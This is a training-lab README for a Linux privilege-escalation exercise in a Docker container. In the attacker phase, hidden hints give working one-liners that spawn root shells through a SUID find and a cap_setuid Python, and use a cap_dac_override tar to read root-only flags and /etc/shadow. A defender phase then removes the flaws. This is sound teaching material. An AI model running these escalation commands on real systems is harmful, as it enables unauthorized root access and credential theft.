# Lab 1A: Linux SUID & POSIX Capabilities Privilege Escalation + Hardening

**Goal:** Experience both sides of Linux privilege boundaries inside an ultra-lightweight Ubuntu 24.04 Docker container (~20 MB RAM):
1. **Attacker Phase (Manual First):** As low-privilege user `student`, enumerate the system manually, discover **3 intentionally misconfigured binaries**, and prove each vector independently by reading its corresponding flag under `/root/flags/`.
2. **Defender Phase (Break & Fix):** Switch to a root admin shell, inspect why each misconfiguration happened, remove the flaws cleanly, and verify your fixes with `./verify_hardening.sh`.

---

## 1. Launch the Lab

```bash
cd Phase_1_Core_Foundations/labs/week1_lab1_suid_caps
./run_lab.sh
```

Inside the container, confirm you start unprivileged:
```bash
id
ls -la /root/flags   # Should return: Permission denied
```

---

## 2. Mission Objectives (Do Manually — No Scanners Yet!)

1. **Enumeration:** Find all SUID/SGID binaries and all binaries with Linux file capabilities (`getcap`).
2. **Vector 1 (SUID Binary):** Escalate to `euid=0` and read `/root/flags/flag1_suid.txt`.
3. **Vector 2 (`CAP_SETUID` Capability):** Escalate to `uid=0` using a binary that has **NO SUID bit**, and read `/root/flags/flag2_cap_setuid.txt`.
4. **Vector 3 (`CAP_DAC_OVERRIDE` Capability):** Bypass DAC file permissions without becoming `uid=0`, and extract `/root/flags/flag3_cap_dac.txt` (and check `/etc/shadow`).

---

## 3. Progressive Hints (Open Only If Stuck!)

<details>
<summary>Hint 1 — Enumeration commands</summary>

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```
Notice how `find -perm -4000` finds only 1 of the 3 custom misconfigurations—`getcap` finds the other 2!
</details>

<details>
<summary>Hint 2 — Vector 1 (SUID & dash -p behavior)</summary>

Look closely at `/usr/local/bin/audit-find`. It is a SUID copy of `find`. Remember from Lesson 1 that `/bin/sh` (`dash`) on Ubuntu drops `euid` unless `-p` is passed:
```bash
/usr/local/bin/audit-find /etc/hostname -exec /bin/sh -p \; -quit
```
</details>

<details>
<summary>Hint 3 — Vector 2 (cap_setuid on Python)</summary>

Look at `/usr/local/bin/py-diag` (`cap_setuid=ep`). Python can call `os.setuid(0)` directly before launching `/bin/bash`:
```bash
/usr/local/bin/py-diag -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
```
</details>

<details>
<summary>Hint 4 — Vector 3 (cap_dac_override on tar)</summary>

`/usr/local/bin/backup-tar` has `cap_dac_override=ep`, letting it read root-only files into an archive stream on stdout (`-cf -`), which your normal `tar` can extract to stdout (`-xOf -`):
```bash
/usr/local/bin/backup-tar -cf - /root/flags/flag3_cap_dac.txt 2>/dev/null | tar -xOf -
```
</details>

---

## 4. Defender Phase (Break & Fix + Verification)

From your **host terminal** (keep the container running), enter as `root` admin:
```bash
./run_lab.sh --root
```

Remove the dangerous permissions/capabilities (or delete unnecessary copies):
```bash
chmod u-s /usr/local/bin/audit-find
setcap -r /usr/local/bin/py-diag
setcap -r /usr/local/bin/backup-tar
exit
```

Now run the automated verification script from the host:
```bash
./verify_hardening.sh
```

When you finish, clean up the container (and optionally save your Feynman writeup in `Phase_1_Core_Foundations/writeups/`):
```bash
./run_lab.sh --clean
```
